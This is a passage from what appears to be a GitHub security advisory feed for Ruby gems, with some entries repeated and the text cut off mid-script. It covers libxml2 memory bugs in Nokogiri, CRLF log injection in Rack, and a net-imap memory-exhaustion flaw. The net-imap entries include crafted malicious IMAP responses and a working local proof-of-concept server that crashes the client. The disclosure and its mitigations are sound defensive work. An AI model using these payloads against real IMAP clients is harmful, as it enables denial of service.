<p>Nokogiri v1.18.3 upgrades its dependency libxml2 to
<a href="https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.13.6">v2.13.6</a>.</p>
<p>libxml2 v2.13.6 addresses:</p>
<ul>
<li>CVE-2025-24928<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/847">https://gitlab.gnome.org/GNOME/libxml2/-/issues/847</a></li>
</ul>
</li>
<li>CVE-2024-56171<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/828">https://gitlab.gnome.org/GNOME/libxml2/-/issues/828</a></li>
</ul>
</li>
</ul>
<h2 id="impact">Impact</h2>
<h3 id="cve-2025-24928">CVE-2025-24928</h3>
<p>Stack-buffer overflow is possible when reporting DTD validation
errors if the input contains a long (~3kb) QName prefix.</p>
<h3 id="cve-2024-56171">CVE-2024-56171</h3>
<p>Use-after-free is possible during validation against untrusted
XML Schemas (.xsd) and, potentially, validation of untrusted documents
against trusted Schemas if they make use of <code>xsd:keyref</code> in combination
with recursively defined types that have additional identity constraints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-vvfq-8hwr-qm4m.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-vvfq-8hwr-qm4m.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-5mwf-688x-mr7x">https://github.com/advisories/GHSA-5mwf-688x-mr7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5mwf-688x-mr7x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-19T22:17:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Nokogiri updates packaged libxml2 to 2.13.6 to resolve CVE-2025-24928 and CVE-2024-56171]]></title>
        <id>https://github.com/advisories/GHSA-vvfq-8hwr-qm4m</id>
        <link href="https://github.com/advisories/GHSA-vvfq-8hwr-qm4m"/>
        <updated>2025-02-18T22:36:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Nokogiri v1.18.3 upgrades its dependency libxml2 to <a href="https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.13.6">v2.13.6</a>.</p>
<p>libxml2 v2.13.6 addresses:</p>
<ul>
<li>CVE-2025-24928<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/847">https://gitlab.gnome.org/GNOME/libxml2/-/issues/847</a></li>
</ul>
</li>
<li>CVE-2024-56171<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/828">https://gitlab.gnome.org/GNOME/libxml2/-/issues/828</a></li>
</ul>
</li>
</ul>
<h2 id="impact">Impact</h2>
<h3 id="cve-2025-24928">CVE-2025-24928</h3>
<p>Stack-buffer overflow is possible when reporting DTD validation errors if the input contains a long (~3kb) QName prefix.</p>
<h3 id="cve-2024-56171">CVE-2024-56171</h3>
<p>Use-after-free is possible during validation against untrusted XML Schemas (.xsd) and, potentially, validation of untrusted documents against trusted Schemas if they make use of <code>xsd:keyref</code> in combination with recursively defined types that have additional identity constraints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m</a></li>
<li><a href="https://github.com/advisories/GHSA-vvfq-8hwr-qm4m">https://github.com/advisories/GHSA-vvfq-8hwr-qm4m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vvfq-8hwr-qm4m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-18T22:36:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rack] Possible Log Injection in Rack::CommonLogger]]></title>
        <id>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</id>
        <link href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"/>
        <updated>2025-02-18T15:04:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>
<h2 id="details">Details</h2>
<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>
<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>
<h2 id="impact">Impact</h2>
<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>
<h2 id="mitigation">Mitigation</h2>
<ul>
<li>Update to the latest version of Rack.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25184">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>
<li><a href="https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T19:18:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rack] Possible Log Injection in Rack::CommonLogger]]></title>
        <id>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</id>
        <link href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"/>
        <updated>2025-02-18T15:04:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>
<h2 id="details">Details</h2>
<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>
<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>
<h2 id="impact">Impact</h2>
<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>
<h2 id="mitigation">Mitigation</h2>
<ul>
<li>Update to the latest version of Rack.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25184">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>
<li><a href="https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T19:18:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rack] Possible Log Injection in Rack::CommonLogger]]></title>
        <id>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</id>
        <link href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"/>
        <updated>2025-02-18T15:04:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>
<h2 id="details">Details</h2>
<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>
<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>
<h2 id="impact">Impact</h2>
<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>
<h2 id="mitigation">Mitigation</h2>
<ul>
<li>Update to the latest version of Rack.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25184">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>
<li><a href="https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T19:18:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
        <updated>2025-02-11T21:39:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
<h3 id="details">Details</h3>
<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
<p>Malicious inputs:</p>
<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"

# Worst *valid* input scenario (using uint32 max),
# 44 bytes expands to 64GiB:
"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"

# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
# UINT32_MAX can be created.  For example, the following would theoretically
# expand to almost 800 exabytes:
"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
</code></pre>
<p>Simple way to test this:</p>
<pre><code class="language-ruby">require "net/imap"

def test(size)
  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\r\n"
  parser = Net::IMAP::ResponseParser.new
  parser.parse input
end

test(99_999_999)
</code></pre>
<h3 id="fixes">Fixes</h3>
<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
<pre><code class="language-ruby"># globally
Net::IMAP.config.parser_use_deprecated_uidplus_data = false
# per-client
imap = Net::IMAP.new(hostname, ssl: true,
                               parser_use_deprecated_uidplus_data: false)
imap.config.parser_use_deprecated_uidplus_data = false
</code></pre>
<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
<p>For v0.3.8, this option is not available.
For v0.4.19, the default value is <code>true</code>.
For v0.5.6, the default value is <code>:up_to_max_size</code>.
For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.
When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
For v0.4.19, the limit defaults to 1000.
For v0.5.6, the limit defaults to 100.
For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
<pre><code class="language-ruby">limit = 1000
imap.add_response_handler do |resp|
  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
  name = resp.name
  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
  if Net::IMAP::VERSION &gt; "0.4.0"
    imap.responses(name) { _1.slice!(0...-limit) }
    imap.responses(code) { _1.slice!(0...-limit) }
  else
    imap.responses(name).slice!(0...-limit)
    imap.responses(code).slice!(0...-limit)
  end
end
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
<pre><code class="language-ruby">#!/usr/bin/env ruby
require 'socket'
require 'net/imap'

if !defined?(Net::IMAP.config)
  puts "Net::IMAP.config is not available"
elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
else
  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
end

size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)

def server_addr
  Addrinfo.tcp("localhost", 0).ip_address
end

def create_tcp_server
  TCPServer.new(server_addr, 0)
end

def start_server
  th = Thread.new do
    yield
  end
  sleep 0.1 until th.stop?
end

def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
end

def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
end

server = create_tcp_server
port = server.addr[1]
puts "Server started on port #{port}"

# server
start_server do
  sock = server.accept
  begin
    sock.print "* OK test server\r\n"
    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"

    malicious_response = appenduid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response

    malicious_response = copyuid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response
    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
    sock.print "#{tag} OK CAPABILITY completed\r\n"

    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"
    sock.print "* BYE If you made it this far, you passed the test!\r\n"
    sock.print "#{tag} OK LOGOUT completed\r\n"
  rescue Exception =&gt; ex
    puts "Error in server: #{ex.message} (#{ex.class})"
  ensure
    sock.close
    server.close
  end
end

# client
begin
  puts "Client connecting,.."
  imap = Net::IMAP.new(server_addr, port: port)
  puts "Received capabilities: #{imap.capability}"
  pp responses: imap.responses
  imap.logout
rescue Exception =&gt; ex
  puts "Error in client: #{ex.message} (#{ex.class})"
  puts ex.full_message
ensure
  imap.disconnect if imap
end
</code></pre>
<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
Server started on port 34291
Client connecting,..
Received: RUBY0001 CAPABILITY
Sending: * OK [APPENDUID 1 1:4294967295] too large?
Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
Error in client: failed to allocate memory (NoMemoryError)
/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
        from /workspace/poc.rb:70:in '&lt;main&gt;'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25186">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-10T17:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
        <updated>2025-02-11T21:39:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
<h3 id="details">Details</h3>
<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
<p>Malicious inputs:</p>
<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"

# Worst *valid* input scenario (using uint32 max),
# 44 bytes expands to 64GiB:
"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"

# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
# UINT32_MAX can be created.  For example, the following would theoretically
# expand to almost 800 exabytes:
"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
</code></pre>
<p>Simple way to test this:</p>
<pre><code class="language-ruby">require "net/imap"

def test(size)
  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\r\n"
  parser = Net::IMAP::ResponseParser.new
  parser.parse input
end

test(99_999_999)
</code></pre>
<h3 id="fixes">Fixes</h3>
<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
<pre><code class="language-ruby"># globally
Net::IMAP.config.parser_use_deprecated_uidplus_data = false
# per-client
imap = Net::IMAP.new(hostname, ssl: true,
                               parser_use_deprecated_uidplus_data: false)
imap.config.parser_use_deprecated_uidplus_data = false
</code></pre>
<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
<p>For v0.3.8, this option is not available.
For v0.4.19, the default value is <code>true</code>.
For v0.5.6, the default value is <code>:up_to_max_size</code>.
For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.
When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
For v0.4.19, the limit defaults to 1000.
For v0.5.6, the limit defaults to 100.
For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
<pre><code class="language-ruby">limit = 1000
imap.add_response_handler do |resp|
  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
  name = resp.name
  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
  if Net::IMAP::VERSION &gt; "0.4.0"
    imap.responses(name) { _1.slice!(0...-limit) }
    imap.responses(code) { _1.slice!(0...-limit) }
  else
    imap.responses(name).slice!(0...-limit)
    imap.responses(code).slice!(0...-limit)
  end
end
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
<pre><code class="language-ruby">#!/usr/bin/env ruby
require 'socket'
require 'net/imap'

if !defined?(Net::IMAP.config)
  puts "Net::IMAP.config is not available"
elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
else
  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
end

size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)

def server_addr
  Addrinfo.tcp("localhost", 0).ip_address
end

def create_tcp_server
  TCPServer.new(server_addr, 0)
end

def start_server
  th = Thread.new do
    yield
  end
  sleep 0.1 until th.stop?
end

def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
end

def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
end

server = create_tcp_server
port = server.addr[1]
puts "Server started on port #{port}"

# server
start_server do
  sock = server.accept
  begin
    sock.print "* OK test server\r\n"
    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"

    malicious_response = appenduid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response

    malicious_response = copyuid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response
    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
    sock.print "#{tag} OK CAPABILITY completed\r\n"

    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"
    sock.print "* BYE If you made it this far, you passed the test!\r\n"
    sock.print "#{tag} OK LOGOUT completed\r\n"
  rescue Exception =&gt; ex
    puts "Error in server: #{ex.message} (#{ex.class})"
  ensure
    sock.close
    server.close
  end
end

# client
begin
  puts "Client connecting,.."
  imap = Net::IMAP.new(server_addr, port: port)
  puts "Received capabilities: #{imap.capability}"
  pp responses: imap.responses
  imap.logout
rescue Exception =&gt; ex
  puts "Error in client: #{ex.message} (#{ex.class})"
  puts ex.full_message
ensure
